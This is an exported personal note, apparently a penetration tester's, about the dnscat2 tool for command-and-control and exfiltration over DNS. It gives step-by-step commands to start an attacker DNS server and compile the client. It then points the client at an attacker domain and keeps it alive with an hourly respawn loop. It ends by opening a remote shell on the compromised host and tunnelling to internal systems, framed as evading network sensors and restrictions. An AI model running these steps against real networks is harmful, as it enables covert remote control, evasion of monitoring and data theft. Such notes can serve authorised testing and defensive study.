<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/><meta name="exporter-version" content="Evernote Mac 7.10 (457750)"/><meta name="author" content="jmrobertson@protonmail.com"/><meta name="created" content="2019-05-29 21:31:55 +0000"/><meta name="source" content="desktop.mac"/><meta name="updated" content="2019-05-30 02:40:55 +0000"/><title>Tool: dnscat2</title></head><body><div>dnscat2: create encrypted c2 channel ove dns, effective tunnel out of most networks</div><div><a href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a></div><div><br/></div><div>C2 and exfil over DNS is great mechanism to:</div><div>-hide traffic, evade network sensors</div><div>-get around network restrictions</div><div>&gt;nw’s don’t allow outbound TCP/UDP traffic or heavily restricted/monitored frequently</div><div>-does not require root privs </div><div>-allows <span style="font-weight: bold;">shell</span> and <span style="font-weight: bold;">exfil</span></div><div><br/></div><div><br/></div><div>*many restricted envs have internal dns servers to resolve internal hosts, allow resolutions of external resources*</div><div>*set up authoritative dns for malicious domain, leverage malicious dns resolutions</div><div><b><img src="Tool%3A%20dnscat2.html.resources/Screen%20Shot%202019-05-29%20at%205.47.27%20PM.png" height="850" width="1214"/><br/></b></div><div><font style="font-size: 18px;"><b/><b>Basic Use</b><br/></font></div><div><b>start malicious DNS:</b></div><div><span style="font-size: 14px;">../dnscat2/server/</span></div><div><span style="font-size: 14px;"># ruby ..dnscat2</span></div><div><span style="font-size: 14px;"><br/></span></div><div><span style="font-size: 14px;"><i>if error on port:</i></span></div><div><span style="font-size: 14px;">$ netstat -tulpn</span></div><div><span style="font-size: 14px;">&gt; take note of what's on the port</span></div><div><span style="font-size: 14px;">$ systemctl disable systemd-resolved.service</span></div><div><span style="font-size: 14px;">$ systemctl stop systemd-resolve</span></div><div><span style="font-size: 14px;">$ netstat -tulpn</span></div><div><span style="font-size: 14px;">&gt; see port is released</span></div><div><span style="font-size: 14px;">ruby ./dnscat2</span></div><div><br/></div><div><b>compile malicious client code: </b></div><div><span style="font-size: 14px;">../dnscat2/client</span></div><div><span style="font-size: 14px;">$make</span></div><div><span style="font-size: 14px;">&gt;see binary for client code</span></div><div><br/></div><div><b>execute payload</b></div><div><span style="font-size: 14px;">-ensure --secret flag set for encryption w/ DNS sever</span></div><div><span style="font-size: 14px;">A) start attack server (in /server)</span></div><div><span style="font-size: 14px;">$ ruby ./dnscat2.rb &lt;domainA&gt; --secret &lt;key1&gt;</span></div><div><span style="font-size: 14px;">B) point client server back to attacker</span></div><div><span style="font-size: 14px;">$ ./dnscat &lt;domainA&gt; --secret &lt;key1&gt;</span></div><div><br/></div><div><span style="font-size: 14px;"><i>ensure payload returns: </i></span></div><div><span style="font-size: 14px;">&gt;if clientside payload dies, spawn a new instance every hour</span></div><div><span style="font-size: 14px;">$ </span><span style="font-size: 14px;">:~/dnscat2/client# nohup /bin/bash -c "while true; do dnscat &lt;domain&gt; --secret &lt;key1&gt; --max-retransmits 5; sleep 3600; done" &gt; /dev/null 2&gt;&amp;1 &amp;</span></div><div><span style="font-weight: bold;"><br/></span></div><div><span style="font-weight: bold;">spawn session on client from attack server<span>    </span></span></div><div>have: live client, live attack dns, connection</div><div><br/></div><div>(on attack)</div><div>$dnscat&gt; window</div><div><span style="font-size: 14px;">&gt;shows active sessions</span></div><div><span style="font-size: 14px;"><br/></span></div><div><span style="font-size: 14px;">$window -i 1</span></div><div><span style="font-size: 14px;">&gt;interact with first open windo</span></div><div><span style="font-size: 14px;"><br/></span></div><div><span style="font-size: 14px;">$shell </span></div><div><span style="font-size: 14px;">&gt;starts shell on client</span></div><div><span style="font-size: 14px;"><br/></span></div><div><span style="font-size: 14px;">&lt;crtl-z&gt;</span></div><div><span style="font-size: 14px;">&gt;back out ot main session on attack</span></div><div><span style="font-size: 14px;"><br/></span></div><div><span style="font-size: 14px;">$window -i 2</span></div><div><span style="font-size: 14px;">&gt;open shell on client from attack</span></div><div><span style="font-size: 14px;"><br/></span></div><div><font style="font-size: 18px;"><b>Tunnel on dnscat</b><br/></font></div><div><font style="font-size: 14px;">-route traffic from attack, through cliet, to other internal servers<br/></font></div><div><font style="font-size: 14px;">-with dnscat2</font></div><ol><li><div>route traffic through local port</div></li><li><div><span style="font-size: 14px;">tunnel it to inernal system on network</span></div></li></ol><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div></body></html>